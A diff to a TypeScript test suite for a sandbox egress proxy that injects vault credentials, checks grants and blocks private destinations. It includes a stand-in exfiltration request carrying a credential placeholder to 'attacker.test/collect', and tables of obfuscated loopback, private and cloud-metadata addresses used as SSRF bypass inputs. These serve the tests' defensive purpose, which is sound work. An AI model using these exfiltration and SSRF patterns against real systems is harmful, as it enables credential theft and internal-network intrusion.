@@ -1,21 +1,20 @@
 // Defends credential injection without exposing the secret to a guest.
 // Native network policy and vault routing are also measured by gate:egress-interception.
-import { describe, expect, test } from 'bun:test';
+import { describe, expect, mock, test } from 'bun:test';
 import {
-  EGRESS_PLACEHOLDER_PREFIX, refusedHostname, type EgressSecretBinding,
+  EGRESS_PLACEHOLDER_PREFIX, refusedHostname,
 } from '@kinu.run/core';
 import type { KinuDevbox } from '../src/kinu-devbox';
 // Static: neither module reaches `cloudflare:email`, so neither needs the mock below.
-import { kinuEgressParams } from '../src/egress/configure';
 import { adaptCloudflareSandbox } from '../src/sandbox-exec-lane';
-import type { EgressInjectionResult } from '@kinu.run/core';
-import type { ContainerEgressEnv, ContainerEventResolver, KinuEgressParams } from '../src/egress/outbound';
+import type { ApprovalGrant, EgressInjectionResult, EgressRequestFacts, UserCaller } from '@kinu.run/core';
+import type { ContainerEgressEnv, ContainerEventResolver, EgressWorkspace, KinuEgressParams } from '../src/egress/outbound';
 import { mockAgentsSdk } from './helpers/agents-sdk';
 import { jsrpcStub } from './helpers/jsrpc-stub';
 import {
   createRecordingLogger, setDiagnosticsSink, type RecordedLog,
 } from '@kinu.run/core/obs';
-import { KINU_USER_AGENT, kinuUserAgent, reoriginateRequest } from '@kinu.run/core';
+import { closeReason, KINU_USER_AGENT, kinuUserAgent, reoriginateRequest } from '@kinu.run/core';
 import { present } from '@kinu.run/test-utils';
 
 // `agents` reaches `cloudflare:email`: mock first, then dynamic imports.
@@ -23,7 +22,7 @@ mockAgentsSdk();
 
 const {
   CONTAINER_EVENT_HOST,
-  handleContainerEgress, handleContainerEvent, parseEgressParams,
+  handleContainerEgress, handleContainerEvent, handleEgressConnect, handleEgressTls, parseEgressParams,
 } = await import('../src/egress/outbound');
 
 const {
@@ -37,13 +36,13 @@ const SECRET = ['sk_live_', 'abcdefghij0123456789'].join('');
 
 const PLACEHOLDER = `${EGRESS_PLACEHOLDER_PREFIX}${'Q'.repeat(43)}`;
 
-const BINDING: EgressSecretBinding = {
-  id: 'stripe', label: 'Stripe', host: 'api.stripe.com', placeholder: PLACEHOLDER,
-};
 
-const PARAMS: KinuEgressParams = {
-  workspaceName: 'kinu-main', ownerUserId: 'user-1', bindings: [BINDING],
-};
+const PARAMS: KinuEgressParams = { workspaceName: 'kinu-main', ownerUserId: 'user-1' };
+
+const STRIPE_GRANT: ApprovalGrant = { rule: 'egress-secret:stripe', executor: 'sandbox' };
+
+/** The workspace's grants as the egress asks for them: Stripe's, for every request that names a placeholder. */
+const WORKSPACE: EgressWorkspace = { grants: async () => [STRIPE_GRANT] };
 
 /** `get` returns a `jsrpcStub`: the real binding is a Proxy, and a literal double hid a TypeError here. */
 function fakeEnv(resolve: () => EgressInjectionResult): ContainerEgressEnv<string> {
@@ -99,7 +98,7 @@ describe('the secret reaches the upstream and comes back scrubbed', () => {
           method: 'POST', headers: { authorization: `Bearer ${PLACEHOLDER}` },
         }),
         fakeEnv(() => ({ kind: 'forward', substitutions: [{ placeholder: PLACEHOLDER, secret: SECRET }] })),
-        PARAMS,
+        PARAMS, WORKSPACE,
       );
 
       expect(response.status).toBe(200);
@@ -124,7 +123,7 @@ describe('the secret reaches the upstream and comes back scrubbed', () => {
       const response = await handleContainerEgress(
         new Request('https://api.stripe.com/v1/charges', { headers: { authorization: `Bearer ${PLACEHOLDER}` } }),
         fakeEnv(() => ({ kind: 'forward', substitutions: [{ placeholder: PLACEHOLDER, secret: SECRET }] })),
-        PARAMS,
+        PARAMS, WORKSPACE,
       );
 
       const body = await response.text();
@@ -140,7 +139,7 @@ describe('the secret reaches the upstream and comes back scrubbed', () => {
     const response = await handleContainerEgress(
       new Request('https://attacker.test/collect', { headers: { authorization: `Bearer ${PLACEHOLDER}` } }),
       fakeEnv(() => ({ kind: 'refuse', status: 403, reason: 'bound to api.stripe.com' })),
-      PARAMS,
+      PARAMS, WORKSPACE,
     );
 
     expect(response.status).toBe(403);
@@ -152,11 +151,25 @@ describe('the secret reaches the upstream and comes back scrubbed', () => {
 
     try {
       const response = await handleContainerEgress(
-        new Request('https://api.stripe.com/'), fakeEnv(() => ({ kind: 'forward', substitutions: [] })), undefined,
+        new Request('https://api.stripe.com/'), fakeEnv(() => ({ kind: 'forward', substitutions: [] })), undefined, WORKSPACE,
       );
 
       expect(response.status).toBe(503);
       expect(upstream.seen).toHaveLength(0);
+    } finally { upstream.restore(); }
+  });
+
+  // A workspace's npm install sends hundreds of requests through here; none names a secret, so none waits on the vault.
+  test('traffic with no placeholder is forwarded without asking the vault, which may be down', async () => {
+    const upstream = captureFetch(() => new Response('ok'));
+
+    try {
+      const response = await handleContainerEgress(
+        new Request('https://registry.npmjs.org/express'), throwingVaultEnv({ cause: new Error('durable object reset') }), PARAMS, WORKSPACE,
+      );
+
+      expect(response.status).toBe(200);
+      expect(upstream.seen.map((request) => request.url)).toEqual(['https://registry.npmjs.org/express']);
     } finally { upstream.restore(); }
   });
 
@@ -167,7 +180,7 @@ describe('the secret reaches the upstream and comes back scrubbed', () => {
       await handleContainerEgress(
         new Request('https://example.com/'),
         fakeEnv(() => ({ kind: 'forward', substitutions: [] })),
-        PARAMS,
+        PARAMS, WORKSPACE,
       );
       expect(upstream.seen[0].url).toBe('https://example.com/');
       expect(upstream.seen[0].headers.get('authorization')).toBeNull();
@@ -176,31 +189,125 @@ describe('the secret reaches the upstream and comes back scrubbed', () => {
 });
 
 describe('what the container is configured with', () => {
-  test('only GRANTED bindings are passed, so an ungranted placeholder is never learned', () => {
-    const params = kinuEgressParams({
-      workspaceName: 'kinu-main',
-      ownerUserId: 'user-1',
-      vault: [BINDING, { id: 'prod-db', label: 'Prod DB', host: 'db.internal', placeholder: `${EGRESS_PLACEHOLDER_PREFIX}${'Z'.repeat(43)}` }],
-      grants: [{ rule: 'egress-secret:stripe', executor: 'sandbox' }],
-    });
-
-    expect(params.bindings.map((b) => b.id)).toEqual(['stripe']);
-    expect(JSON.stringify(params)).not.toContain('prod-db');
-  });
-
-  test('a grant on another executor does not widen the container', () => {
-    const params = kinuEgressParams({
-      workspaceName: 'w', ownerUserId: 'u', vault: [BINDING],
-      grants: [{ rule: 'egress-secret:stripe', executor: 'device' }],
-    });
-
-    expect(params.bindings).toEqual([]);
-  });
-
   test('params are parsed, so a malformed configuration reads as unconfigured', () => {
     expect(parseEgressParams({ props: PARAMS })).toEqual(PARAMS);
     expect(parseEgressParams({ props: { workspaceName: 'w' } })).toBeUndefined();
     expect(parseEgressParams({ props: undefined })).toBeUndefined();
+  });
+});
+
+describe('the vault is read when a request names a secret, never before', () => {
+  test('a placeholder is planned by the vault against the workspace\'s grants as it asks', async () => {
+    const upstream = captureFetch(() => new Response('ok'));
+
+    const env: ContainerEgressEnv<string> = {
+      UserDO: {
+        idFromName: (name: string) => name,
+        get: () => jsrpcStub({
+          // The secret is spent only under the workspace's grant.
+          resolveEgressInjection: async (_caller: UserCaller, _facts: EgressRequestFacts, grants: readonly ApprovalGrant[]): Promise<EgressInjectionResult> => (
+            grants.includes(STRIPE_GRANT)
+              ? { kind: 'forward', substitutions: [{ placeholder: PLACEHOLDER, secret: SECRET }] }
+              : { kind: 'refuse', status: 403, reason: 'not bound to any approved secret' }
+          ),
+        }),
+      },
+      CREDENTIAL_ENCRYPTION_KEY: 'a-test-credential-encryption-key-0123456789',
+    };
+
+    try {
+      const response = await handleContainerEgress(
+        new Request('https://api.stripe.com/v1/charges', { headers: { authorization: `Bearer ${PLACEHOLDER}` } }), env, PARAMS, WORKSPACE,
+      );
+
+      expect(response.status).toBe(200);
+      expect(upstream.seen[0]?.headers.get('authorization')).toBe(`Bearer ${SECRET}`);
+    } finally { upstream.restore(); }
+  });
+
+  test('a deployment with no root secret refuses only the request that names a secret, and says why', async () => {
+    const upstream = captureFetch(() => new Response('ok'));
+
+    const env: ContainerEgressEnv<string> = {
+      UserDO: {
+        idFromName: (name: string) => name,
+        get: () => jsrpcStub({ resolveEgressInjection: async () => { throw new Error('no vault is reached without a root secret'); } }),
+      },
+    };
+
+    try {
+      const named = await handleContainerEgress(
+        new Request('https://api.stripe.com/v1/charges', { headers: { authorization: `Bearer ${PLACEHOLDER}` } }), env, PARAMS, WORKSPACE,
+      );
+
+      const plain = await handleContainerEgress(new Request('https://registry.npmjs.org/express'), env, PARAMS, WORKSPACE);
+
+      expect(named.status).toBe(503);
+      expect(plain.status).toBe(200);
+      expect(upstream.seen.map((request) => request.url)).toEqual(['https://registry.npmjs.org/express']);
+    } finally { upstream.restore(); }
+  });
+});
+
+describe('the workspace\'s grants are read as they stand', () => {
+  test('a secret granted after the egress was minted is spent on the next request, without a restart', async () => {
+    const granted: ApprovalGrant[] = [];
+    const upstream = captureFetch(() => new Response('ok'));
+
+    const env: ContainerEgressEnv<string> = {
+      UserDO: {
+        idFromName: (name: string) => name,
+        get: () => jsrpcStub({
+          resolveEgressInjection: async (_caller: UserCaller, _facts: EgressRequestFacts, grants: readonly ApprovalGrant[]): Promise<EgressInjectionResult> => (
+            grants.length === 0
+              ? { kind: 'refuse', status: 403, reason: 'not bound to any approved secret' }
+              : { kind: 'forward', substitutions: [{ placeholder: PLACEHOLDER, secret: SECRET }] }
+          ),
+        }),
+      },
+      CREDENTIAL_ENCRYPTION_KEY: 'a-test-credential-encryption-key-0123456789',
+    };
+
+    const request = () => new Request('https://api.stripe.com/v1/charges', { headers: { authorization: `Bearer ${PLACEHOLDER}` } });
+
+    try {
+      const before = await handleContainerEgress(request(), env, PARAMS, { grants: async () => [...granted] });
+
+      granted.push(STRIPE_GRANT);
+      const after = await handleContainerEgress(request(), env, PARAMS, { grants: async () => [...granted] });
+
+      expect([before.status, after.status]).toEqual([403, 200]);
+      expect(upstream.seen.map((sent) => sent.headers.get('authorization'))).toEqual([`Bearer ${SECRET}`]);
+    } finally { upstream.restore(); }
+  });
+
+  test('a request that names no placeholder asks neither the workspace nor the vault', async () => {
+    const upstream = captureFetch(() => new Response('ok'));
+
+    try {
+      // Both throw if asked: a forwarded request is the proof neither was.
+      const response = await handleContainerEgress(
+        new Request('https://registry.npmjs.org/express'), throwingVaultEnv({ cause: new Error('the vault is not asked') }), PARAMS,
+        { grants: async () => { throw new Error('the workspace is not asked'); } },
+      );
+
+      expect(response.status).toBe(200);
+    } finally { upstream.restore(); }
+  });
+
+  test('a workspace that cannot answer for its grants refuses the request that names a secret, and sends nothing', async () => {
+    const upstream = captureFetch(() => new Response('should not happen'));
+
+    try {
+      const response = await handleContainerEgress(
+        new Request('https://api.stripe.com/', { headers: { authorization: `Bearer ${PLACEHOLDER}` } }),
+        fakeEnv(() => ({ kind: 'forward', substitutions: [{ placeholder: PLACEHOLDER, secret: SECRET }] })), PARAMS,
+        { grants: async () => { throw new Error('the workspace object reset'); } },
+      );
+
+      expect(response.status).toBe(503);
+      expect(upstream.seen).toHaveLength(0);
+    } finally { upstream.restore(); }
   });
 });
 
@@ -352,7 +459,7 @@ describe('one User-Agent for everything a container sends', () => {
       await handleContainerEgress(
         new Request('https://example.com/', { headers: { 'user-agent': 'curl/8.5.0' } }),
         fakeEnv(() => ({ kind: 'forward', substitutions: [] })),
-        PARAMS,
+        PARAMS, WORKSPACE,
       );
       expect(upstream.seen[0].headers.get('user-agent')).toBe(`${KINU_USER_AGENT} curl/8.5.0`);
     } finally { upstream.restore(); }
@@ -367,7 +474,7 @@ describe('one User-Agent for everything a container sends', () => {
           method: 'POST', headers: { authorization: `Bearer ${PLACEHOLDER}`, 'user-agent': 'curl/8.5.0' },
         }),
         fakeEnv(() => ({ kind: 'forward', substitutions: [{ placeholder: PLACEHOLDER, secret: SECRET }] })),
-        PARAMS,
+        PARAMS, WORKSPACE,
       );
       expect(upstream.seen[0].headers.get('user-agent')).toBe(`${KINU_USER_AGENT} curl/8.5.0`);
     } finally { upstream.restore(); }
@@ -380,7 +487,7 @@ describe('one User-Agent for everything a container sends', () => {
       await handleContainerEgress(
         new Request('https://example.com/'),
         fakeEnv(() => ({ kind: 'forward', substitutions: [] })),
-        PARAMS,
+        PARAMS, WORKSPACE,
       );
       expect(upstream.seen[0].headers.get('user-agent')).toBe(KINU_USER_AGENT);
     } finally { upstream.restore(); }
@@ -417,7 +524,7 @@ describe('the forwarded body is the container\'s own, not a copy of it', () => {
       const inbound = new Request('https://example.com/upload', init);
       const body = inbound.body;
       await handleContainerEgress(
-        inbound, fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS,
+        inbound, fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS, WORKSPACE,
       );
       expect(upstream.seen[0].body).toBe(body);
     } finally { upstream.restore(); }
@@ -443,7 +550,7 @@ describe('a throw at the boundary becomes a classified answer', () => {
       response = await handleContainerEgress(
         new Request('https://api.stripe.com/v1/charges', { headers: { authorization: `Bearer ${PLACEHOLDER}` } }),
         throwingVaultEnv({ cause: new Error('durable object reset') }),
-        PARAMS,
+        PARAMS, WORKSPACE,
       );
     });
 
@@ -463,7 +570,7 @@ describe('a throw at the boundary becomes a classified answer', () => {
     const timeout = new DOMException('The operation timed out', 'TimeoutError');
 
     const response = await handleContainerEgress(
-      new Request('https://api.stripe.com/'), throwingVaultEnv({ cause: timeout }), PARAMS,
+      new Request('https://api.stripe.com/', { headers: { authorization: `Bearer ${PLACEHOLDER}` } }), throwingVaultEnv({ cause: timeout }), PARAMS, WORKSPACE,
     );
 
     expect(response.status).toBe(504);
@@ -478,7 +585,7 @@ describe('a throw at the boundary becomes a classified answer', () => {
         response = await handleContainerEgress(
           new Request('https://example.com/'),
           fakeEnv(() => ({ kind: 'forward', substitutions: [] })),
-          PARAMS,
+          PARAMS, WORKSPACE,
         );
       });
 
@@ -503,7 +610,7 @@ describe('a throw at the boundary becomes a classified answer', () => {
         response = await handleContainerEgress(
           new Request('https://api.stripe.com/v1/charges', { headers: { authorization: `Bearer ${PLACEHOLDER}` } }),
           fakeEnv(() => ({ kind: 'forward', substitutions: [{ placeholder: PLACEHOLDER, secret: SECRET }] })),
-          PARAMS,
+          PARAMS, WORKSPACE,
         );
       });
 
@@ -560,7 +667,7 @@ describe('private destinations are refused at the one place requests leave', () 
 
     try {
       const refusal = await handleContainerEgress(
-        new Request(target), fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS,
+        new Request(target), fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS, WORKSPACE,
       );
 
       expect(refusal.status).toBe(403);
@@ -573,7 +680,7 @@ describe('private destinations are refused at the one place requests leave', () 
     const emitted = await recordDiagnostics(async () => {
       await handleContainerEgress(
         new Request('http://169.254.169.254/latest/meta-data/'),
-        fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS,
+        fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS, WORKSPACE,
       );
     });
 
@@ -589,7 +696,7 @@ describe('private destinations are refused at the one place requests leave', () 
     try {
       const response = await handleContainerEgress(
         new Request('https://example.com/'),
-        fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS,
+        fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS, WORKSPACE,
       );
 
       expect(response.status).toBe(200);
@@ -612,7 +719,7 @@ describe('every redirect hop is judged, not trusted', () => {
     try {
       const first = await handleContainerEgress(
         new Request('https://public.example/start'),
-        fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS,
+        fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS, WORKSPACE,
       );
 
       expect(first.status).toBe(302);
@@ -627,12 +734,193 @@ describe('every redirect hop is judged, not trusted', () => {
     try {
       const second = await handleContainerEgress(
         new Request('http://169.254.169.254/latest/meta-data/'),
-        fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS,
+        fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS, WORKSPACE,
       );
 
       expect(second.status).toBe(403);
       expect(await second.json()).toMatchObject({ reason: 'denied' });
       expect(refused.seen).toHaveLength(0);
     } finally { refused.restore(); }
+  });
+});
+
+/** A program's socket as the egress's connect handler receives it, naming `address`; records whether it was closed. */
+function inboundSocket(address: string): Socket & { readonly wasClosed: () => boolean } {
+  let closed = false;
+
+  // workerd's `Socket` has no constructor a test can call; the handler reads only these members.
+  const socket: Socket & { readonly wasClosed: () => boolean } = {
+    opened: Promise.resolve({ localAddress: address }),
+    closed: new Promise<void>(() => {}),
+    upgraded: false,
+    secureTransport: 'off',
+    readable: new ReadableStream(),
+    writable: new WritableStream(),
+    close: async () => { closed = true; },
+    startTls: () => { throw new Error('not reached'); },
+    wasClosed: () => closed,
+  };
+
+  return socket;
+}
+
+// Owner's rule (2026-10-10): a workspace program's raw socket is judged by where it goes, as a request is, and only that.
+describe('a workspace program\'s TCP socket', () => {
+  // The private addresses in other spellings: 2026-10-12 security review, the judge saw the raw string and the socket
+  // went to whatever the platform made of it.
+  test.each([
+    '127.0.0.1:5432', '10.0.0.7:22', '[::1]:6379', 'metadata.google.internal:80', 'db.localhost:5432',
+    '0x7f.0.0.1:5432', '0x7f.1:5432', '012.0.0.1:22', '2130706433:80', '64:ff9b::7f00:1:6379', '64:ff9b::a00:1:22',
+    '2002:7f00:1:::80', '2002:a00:1:::22', '198.18.0.1:80', '[64:ff9b::a00:1]:22', '[2001:0:4136:e378:8000:63bf:80ff:fffe]:80',
+  ])('to %p is refused before anything is dialled', async (address) => {
+    const socket = inboundSocket(address);
+
+    dialled.length = 0;
+    await recordDiagnostics(async () => { await handleEgressConnect(socket, PARAMS); });
+
+    expect(socket.wasClosed()).toBe(true);
+    expect(dialled).toEqual([]);
+  });
+
+  test('to a public host goes where it was judged, in the form it was judged', async () => {
+    // Programs that send nothing and hang up, so each carried socket ends.
+    const quiet = (address: string) => ({ ...inboundSocket(address), readable: ended() });
+
+    dialled.length = 0;
+    await handleEgressConnect(quiet('DB.Example.COM.:5432'), PARAMS);
+    await handleEgressConnect(quiet('[2606:4700:4700:0:0:0:0:1111]:53'), PARAMS);
+
+    // connect() reaches an IPv6 literal only bracketed (PLATFORM_CATALOG 'worker.connect.address_forms').
+    expect(dialled.map(({ hostname, port }) => ({ hostname, port }))).toEqual([
+      { hostname: 'db.example.com', port: 5432 }, { hostname: '[2606:4700:4700::1111]', port: 53 },
+    ]);
+  });
+
+  test('refused under a keyed name logs where it went, never the name\'s tags', async () => {
+    const tags = 'ab'.repeat(32);
+    const keyed = `${Buffer.from('10.0.0.7').toString('hex')}.k.${tags.slice(0, 62)}.${tags.slice(62)}.tcp.nimbus-egress.invalid:5432`;
+
+    const emitted = await recordDiagnostics(async () => { await handleEgressConnect(inboundSocket(keyed), PARAMS); });
+
+    expect(JSON.stringify(emitted)).not.toContain(tags.slice(0, 16));
+  });
+
+  test('from an unconfigured workspace is refused, as its requests are', async () => {
+    const socket = inboundSocket('example.com:5432');
+
+    await handleEgressConnect(socket, undefined);
+
+    expect(socket.wasClosed()).toBe(true);
+  });
+
+  test('that names no port is refused', async () => {
+    const socket = inboundSocket('example.com');
+
+    await handleEgressConnect(socket, PARAMS);
+
+    expect(socket.wasClosed()).toBe(true);
+  });
+});
+
+/** Where the egress asked the platform to connect, and which name the server's certificate is checked against. */
+interface Dialled {
+  hostname: string;
+  port: number;
+  checks: string | null;
+}
+
+/** Every TLS dial this file's stand-in for `cloudflare:sockets` was asked for. */
+const dialled: Dialled[] = [];
+
+/** A connection whose server says nothing and hangs up, so a socket carried over it ends. */
+const ended = () => new ReadableStream<Uint8Array>({ start: (controller) => { controller.close(); } });
+
+const opened = () => ({ readable: ended(), writable: new WritableStream<Uint8Array>(), opened: Promise.resolve() });
+
+await mock.module('cloudflare:sockets', () => ({
+  connect: (target: { hostname: string; port: number }, options: { secureTransport: string }) => {
+    // TLS from the start checks the host; a later startTls checks the name it is given.
+    const record: Dialled = { ...target, checks: options.secureTransport === 'on' ? target.hostname : null };
+
+    dialled.push(record);
+
+    return {
+      ...opened(),
+      startTls: (tls: { expectedServerHostname: string }) => {
+        record.checks = tls.expectedServerHostname;
+
+        return opened();
+      },
+    };
+  },
+}));
+
+// A program's TLS socket arrives as Nimbus's connectTls call (NIMBUS-ASKS #44): the host is judged, then the session is
+// made here, checking the server by the program's servername where it named one other than the host, as Node does.
+describe('a workspace program\'s TLS socket', () => {
+  // A target names its host as the program wrote it: no URL parser has made it canonical. 2026-10-12 security review:
+  // the judge saw the raw string and the session went to whatever the platform made of it.
+  test.each([
+    '127.0.0.1', '10.0.0.7', 'metadata.google.internal', 'localhost.', 'LOCALHOST',
+    '0x7f.1', '0x7f.0.0.1', '012.0.0.1', '0177.0.0.1', '127.1', '2130706433',
+    '::1', '[::1]', '0:0:0:0:0:0:0:1', '::', '::ffff:127.0.0.1', '::ffff:7f00:1', '::ffff:169.254.169.254', 'fe80::a', 'fec0::1', 'fd00::1',
+    '64:ff9b::a00:1', '64:ff9b::7f00:1', '64:ff9b:1::5', '2002:7f00:1::', '[2002:c0a8:101::]', '2001:0:4136:e378:8000:63bf:80ff:fffe',
+    '198.18.0.1', '198.19.255.255', '192.0.0.8', '224.0.0.251', '255.255.255.255', 'ff02::fb', '100::1', '2001:db8::1',
+    '', 'exa mple.com', 'a.1', '1.2.3.4.5', '[::1', '::g', 'not:an:ipv6:', '12zz::1', '1.2.3.4::', '::1.2.3', 'fe80::1%eth0', '1:2:3:4:5:6:7:8:9',
+  ])('to %p is refused before anything is dialled', async (hostname) => {
+    dialled.length = 0;
+    await recordDiagnostics(async () => {
+      await expect(handleEgressTls({ hostname, port: 443 }, PARAMS)).rejects.toMatchObject({ code: 'denied' });
+    });
+
+    expect(dialled).toEqual([]);
+  });
+
+  test('from an unconfigured workspace is refused, as its requests are', async () => {
+    await expect(handleEgressTls({ hostname: 'example.com', port: 443 }, undefined)).rejects.toMatchObject({ code: 'denied' });
+  });
+
+  test.each([
+    ['Example.COM.', 'example.com'], ['bücher.de', 'xn--bcher-kva.de'], ['1.1.1.1', '1.1.1.1'], ['198.20.0.1', '198.20.0.1'],
+    ['2606:4700:4700:0:0:0:0:1111', '[2606:4700:4700::1111]'], ['[2606:4700:4700::1111]', '[2606:4700:4700::1111]'],
+    ['::ffff:8.8.8.8', '[::ffff:808:808]'], ['64:ff9b::101:101', '[64:ff9b::101:101]'], ['2002:101:101::', '[2002:101:101::]'],
+    ['1:2:3:4:5:6:1.2.3.4', '[1:2:3:4:5:6:102:304]'],
+  ])('to %p reaches %p', async (hostname, reached) => {
+    dialled.length = 0;
+    await handleEgressTls({ hostname, port: 443 }, PARAMS);
+
+    expect(dialled.map((dial) => dial.hostname)).toEqual([reached]);
+  });
+
+  describe('the session it makes', () => {
+    test('checks the host itself when the program named no other servername', async () => {
+      dialled.length = 0;
+      await handleEgressTls({ hostname: 'example.com', port: 443 }, PARAMS);
+
+      expect(dialled).toEqual([{ hostname: 'example.com', port: 443, checks: 'example.com' }]);
+    });
+
+    test('presents and checks the program\'s servername on a connection to the host', async () => {
+      dialled.length = 0;
+      await handleEgressTls({ hostname: 'lb.example.com', port: 8443, servername: 'api.example.com' }, PARAMS);
+
+      expect(dialled).toEqual([{ hostname: 'lb.example.com', port: 8443, checks: 'api.example.com' }]);
+    });
+  });
+});
+
+// 2026-10-12 security review: a scrubbed close reason can outgrow the server's, and close() throws past 123 bytes.
+describe('a relayed WebSocket close reason', () => {
+  test.each(['é'.repeat(100), `${'x'.repeat(121)}😀tail`, '界'.repeat(60), 'short reason'])('%p fits a close frame, as much of it as fits, cut only between whole code points', (reason) => {
+    const bytes = (text: string) => new TextEncoder().encode(text).byteLength;
+    const cut = closeReason(reason);
+    const rest = reason.slice(cut.length).codePointAt(0);
+    const next = rest === undefined ? undefined : String.fromCodePoint(rest);
+
+    // RFC 6455 §5.5: a close frame's reason is at most 123 bytes of UTF-8.
+    expect(bytes(cut)).toBeLessThanOrEqual(123);
+    // A cut through a code point would leave a lone surrogate, which UTF-8 cannot carry.
+    expect(reason.startsWith(cut) && new TextDecoder().decode(new TextEncoder().encode(cut)) === cut).toBe(true);
+    expect(next === undefined || bytes(cut + next) > 123).toBe(true);
   });
 });
